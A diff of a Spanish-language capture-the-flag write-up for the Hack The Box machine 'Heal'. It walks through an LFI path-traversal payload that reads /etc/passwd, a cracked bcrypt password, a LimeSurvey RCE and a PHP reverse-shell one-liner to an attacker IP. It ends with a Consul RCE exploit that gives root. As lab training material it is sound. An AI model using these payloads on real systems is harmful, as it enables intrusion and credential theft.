@@ -8,14 +8,14 @@ draft: False
 ---
 ## Reconocimiento
 
-Empezaremos usando nuestra herramienta de confianza la cual es __NMAP__ 
+Empezaremos el reconocimiento de la maquina para saber que puerto estna abiertos y que servicios estan corriendo, usando nuestra herramienta de confianza la cual es __NMAP__ 
 
 ```bash
-$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.46 -oG allports
+ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.46 -oG allports
 ```
 
 
-![Firts](./Pasted%20image%2020250115222425.jpeg)
+![Firts](./Pasted%20image%2020250115222449.jpeg)
 
 El reconocimiento no muestra que tenemos dos puertos abiertos, que son los siguientes:  
 ```bash
@@ -26,10 +26,10 @@ El reconocimiento no muestra que tenemos dos puertos abiertos, que son los sigui
 Para saber que tipo de servicio están ejecutándose a través de esto puertos  usaremos __NMAP__ de nuevo 
 
 ```bash
-$ namp -sSV -p22,80 10.10.11.46 -oN Ports
+ namp -sSV -p22,80 10.10.11.46 -oN Ports
 ```
 
-![Pasted image](/src/content/posts/Images/Pasted%20image%2020250115222500.png)
+![Pasted image](./Pasted%20image%2020250115222500.jpeg)
 Ok tenemos `ssh` y `nginx` con la versión `1.18.0`  la cual esta un poco desactualizada pero en este caso no supone un riego 
 
 ## Visitando la pagina 
@@ -39,34 +39,33 @@ Para que la pagina nos resuelva recuerda modificar tu `/etc/hosts` con las sigui
 10.10.11.46 heal.htb
 10.10.11.46 api.heal.htb
 ```
-![[Pasted image 20250115222425.png]]
+![Pasted image](./Pasted%20image%2020250115222425.jpeg)
 
 Nos recibe este hermoso Login el cual podemos probar si es vulnerable a inyecciones __SQL__ o __NoSQL__, pero ya te adelanto que no los es 
 
-![[Pasted image 20250115223013.png]]
+![Pasted image](./Pasted%20image%2020250115223013.jpeg)
 
 Podemos usar __whatweb__ para conocer que tipos de tecnologías implementa la pagina 
 ```bash
 whatweb 10.10.11.46
 ```
 
-![[Pasted image 20250115223144.png]]
+![Pasted image](./Pasted%20image%2020250115223144.jpeg)
 Pero no tenemos gran novedad así que lo mejor es seguir explorando la pagina.
 
 Nos registraremos a través del link que tiene la leyenda de " __NEW HERE? SING UP__ " e iniciaremos sección. Una vez dentro la pagina sirve para crear currículos en la cual llenas los datos y los exporta en PDF  
 
-![[Pasted image 20250115223445.png]]
+![Pasted image](./Pasted%20image%2020250115223445.jpeg)
 
 Siempre que una pagina web trata con archivos es importante validar que lo hacer bien ya que si no es así tenemos de donde iniciar el ataque  
 
 ## Interceptando el PDF 
 
 Interceptaremos la petición que se realiza cuando exportamos el PDF con este botón utilizando BurpSuite y foxyProxy 
-![[Pasted image 20250115223705.png]]
-
+![Pasted image](./Pasted%20image%2020250115223705.jpeg)
 
 Esto es lo primero que nos muestra la verdad nada interesante por ahora
-![[Pasted image 20250115223752.png]]
+![Pasted image ](./Pasted%20image%2020250115223752.jpeg)
 
 Aqui tenemos algo que nos puede interesar, la parte del 
 ```php
@@ -75,10 +74,12 @@ Aqui tenemos algo que nos puede interesar, la parte del
 
 Por lo general son vulnerables a un `LFI`
 
-![[Pasted image 20250115223905.png]]
+![Pasted image](./Pasted%20image%2020250115223905.jpeg)
+
 
 Y llegamos a la petición que nos interesa, la mandaremos al Repeater 
-![[Pasted image 20250115224046.png]]
+![Pasted image](./Pasted%20image%2020250115224046.jpeg)
+
 
 ## Explotación LFI 
 
@@ -89,7 +90,8 @@ Como dije anteriormente, cuando vemos un `codigo?variable=` suelen ser vulnerabl
 GET /download?filename=../../../../../../../etc/passwd
 ```
 
-![[Pasted image 20250115224248.png]]
+![Pasted image](./Pasted%20image%2020250115224248.jpeg)
+
 
 Podemos leer el `passwd` y con ello encontramos a los siguientes usuario del sistema :
 
@@ -103,7 +105,8 @@ postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 
 
 Ok ahora a mirar el archivo del `crontab` . pero en esta ocasión no tenemos nada interesante 
-![[Pasted image 20250115224836.png]]
+![Pasted image](./Pasted%20image%2020250115224836.jpeg)
+
 
 
 # Sub-Dominios 
@@ -114,8 +117,11 @@ heal.htb que # Es el de la pagina principal
 api.heal.htn # Ques el el Api que esta por detras 
 ```
 
-Pero contamos con un tercero el cual lo podemos encontrar en el botón de `survey`![[Pasted image 20250115225234.png]]
-![[Pasted image 20250115225243.png]]![[Pasted image 20250115225252.png]]
+Pero contamos con un tercero el cual lo podemos encontrar en el botón de `survey`
+![Pasted image](./Pasted%20image%2020250115225234.jpeg)
+![Pasted image](./Pasted%20image%2020250115225243.jpeg)
+![Pasted image](./Pasted%20image%2020250115225252.jpeg)
+
 
 El tercer dominio es el de 
 ```python
@@ -131,17 +137,20 @@ $  wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-li
 Con el cual podemos encontrar una dirección de `Admin`
 al ponerlo en el navegador nos mostrara un panel de inicio de sesión 
 
-![[Pasted image 20250115225544.png]]
+![Pasted image](./Pasted%20image%2020250115225544.jpeg)
+
 
 No solo eso en la dirección de `index.php` , nos dan a conocer que el usuario `ralph` es administrador de la pagina 
 
-![[Pasted image 20250115225711.png]]
+![Pasted image](./Pasted%20image%2020250115225711.jpeg)
+
 
 ## Sub-Dominio api.heal.htb
 
 Podemos visitar el dominio de __api.heal.htb__ y encontraremos que tiene una versión 7.1.4 
 
-![[Pasted image 20250115225859.png]]
+![Pasted image](./Pasted%20image%2020250115225859.jpeg)
+
 
 Investigando un poco para saber si existe una vulnerabilidad critica en algunos de los servicios de __RAILS__ o de __LiveSurvey__ no encontré nada pero `rails` al ser una Api tiene archivos de configuración los cuales son los siguientes 
 
@@ -161,16 +170,19 @@ El archivo nos da mas información, para ser mas preciso nos muestra una nueva r
 storage/development.sqlite3 
 ```
 
-![[Pasted image 20250115230413.png]]
+![Pasted image](./Pasted%20image%2020250115230413.jpeg)
+
 
 # Usuario Ralph
 
 hemos encontrado al usuario ralph y el hash de su contraseña 
 
-![[Pasted image 20250115230546.png]]
+![Pasted image](./Pasted%20image%2020250115230546.jpeg)
+
 
 Este tipo de hash que inicia con ' $ 2 a $ '  suele ser de tipo `bcrypt` 
-![[Pasted image 20250115230740.png]]
+![Pasted image](./Pasted%20image%2020250115230740.jpeg)
+
 
 Bien ahora que sabemos el tipo de encriptación procedemos a usar `john` para romperla 
 
@@ -179,16 +191,20 @@ Bien ahora que sabemos el tipo de encriptación procedemos a usar `john` para ro
 ```
 
 Y el resultado es 147258369
-![[Pasted image 20250116224600.png]]
+![Pasted image](./Pasted%20image%2020250116224600.jpeg)
+
 
 Con esto hecho tenemos las credenciales de `ralph` pero, donde iniciamos sección con estas mismas? 
 
 Intente conectarme por `ssh` pero no son validas, lo cual me llevo al panel de inicio de seccion de `livesurvey`, y resultaron ser validas 
 
-![[Pasted image 20250116224955.png]]
+![Pasted image](./Pasted%20image%2020250116224955.jpeg)
+
 
 Dentro del panel de administración en la parte inferior izquierda nos muestra la versión de la pagina, la cual es la `6.6.4` 
-![[Pasted image 20250116225119.png]]![[Pasted image 20250116225123.png]]
+![Pasted image](./Pasted%20image%2020250116225119.jpeg)
+![Pasted image](./Pasted%20image%2020250116225123.jpeg)
+
 
 Buscando por internet encontramos que tiene una vulnerabilidad de RCE, en el siguiente link nos detallan mas el funcionamiento del exploit:
 
@@ -225,10 +241,12 @@ Este script nos proporciona una `web shell` la cual usaremos para entablar una r
 php -r '$sock=fsockopen("10.10.16.78",443);shell_exec("sh <&3 >&3 2>&3");'
 ```
 
-![[Pasted image 20250116230204.png]]
+![Pasted image](./Pasted%20image%2020250116230204.jpeg)
+
 
 y conseguimos nuestra reverse shell
-![[Pasted image 20250116230209.png]]
+![Pasted image](./Pasted%20image%2020250116230209.jpeg)
+
 
 Si quieres puedes dar un tratamiento para que las flechas, Crtl L funcione.
 
@@ -248,11 +266,13 @@ export TERM=xterm;export SHELL=bash;stty rows 41 columns 192
 
 Empezaremos la búsqueda de información privilegiada ya que como www-data no tenemos muchos privilegios 
 Tenemos un nuevo usuario que es `ron` el cual encontramos en la carpeta de `home` 
-![[Pasted image 20250116230730.png]]
+![Pasted image](./Pasted%20image%2020250116230730.jpeg)
+
 
 Si vemos el contenido de la carpeta `/var/www` no encontraremos con un único archivo el cual no nos da pistas de algo o alguien
 
-![[Pasted image 20250116230735.png]]
+![Pasted image](./Pasted%20image%2020250116230735.jpeg)
+
 
 Procederemos a buscar archivos de configuración de las aplicaciones de `RAILS` o `LiveSurvey`.
 
@@ -293,14 +313,15 @@ El archivo `config.php` en la ruta `/var/www/limesurvey/application/config/confi
 
 Ojo que podemos encontrar Bases de Datos, si miramos el archivo encontraremos credenciales
 
-![[Pasted image 20250116231311.png]]
+![Pasted image](./Pasted%20image%2020250116231311.jpeg)
+
 
 Por suerte la contraseña no esta hardcodeada, pero a quien corresponde esta contraseña?, pues al usuario de `ron` 
 
 Nos conectaremos por `ssh` y con ella la primera Flag 
-![[Pasted image 20250116231505.png]]
+![Pasted image](./Pasted%20image%2020250116231505.jpeg)
+![Pasted image](./Pasted%20image%2020250116231522.jpeg)
 
-![[Pasted image 20250116231522.png]]
 
 Ahora bien dentro de la maquina tenemos algunos puertos abiertos pero nos concentraremos en el puerto 8500 el cual tiene el servicio llamado Cónsul, pero para poder verlo haremos un  `Secure Shell Tunnel`
 
@@ -316,30 +337,37 @@ Para realizar el secure shell tunnel aplicaremos el siguiente comando
 
 Una vez hecho esto entraremos en nuestro `localhost`  y podremos visualizar el servicio de aqui partiremos a ver la estructura de la pagina
 
-![[Pasted image 20250120205803.png]]
+![Pasted image](./Pasted%20image%2020250120205803.jpeg)
+
 
 Después de revisar y husmear por la pagina encontramos que la versión de Consul es la siguiente:
 
-![[Pasted image 20250120210127.png]]
+![Pasted image](./Pasted%20image%2020250120210127.jpeg)
+
 
 Una búsqueda en search exploit, y encontramos que esta versión tiene una  vulnerabilidad de `RCE` 
 
-![[Pasted image 20250120210257.png]]
+![Pasted image](./Pasted%20image%2020250120210257.jpeg)
+
 
 
 Nos descargaremos el `.txt` referente a esta vulnerabilidad, esta como `.txt` pero realmente es un script de Python así que cambiamos la extensión del archivo 
-![[Pasted image 20250120210321.png]]
+![Pasted image](./Pasted%20image%2020250120210321.jpeg)
+
 
 Lo ejecutamos y nos pide los siguientes requerimientos: `host`, `puerto` , `mi_ip`, `un puerto que queramos` y un `token` que en este caso no es necesario lo dejaremos en `1`
-![[Pasted image 20250120210525.png]]
+![Pasted image](./Pasted%20image%2020250120210525.jpeg)
+
 
 ahora bien ante de ejecutar este `script` nos pondremos en escucha por el puerto que especificamos anteriormente 
 
-![[Pasted image 20250120210709.png]]
+![Pasted image](./Pasted%20image%2020250120210709.jpeg)
+
 
 Y `BINGO` el servicio lo esta ejecutando el usuario de `root`  
 
-![[Pasted image 20250120210849.png]]
+![Pasted image](./Pasted%20image%2020250120210849.jpeg)
+
 
 
 ## Conclusión 
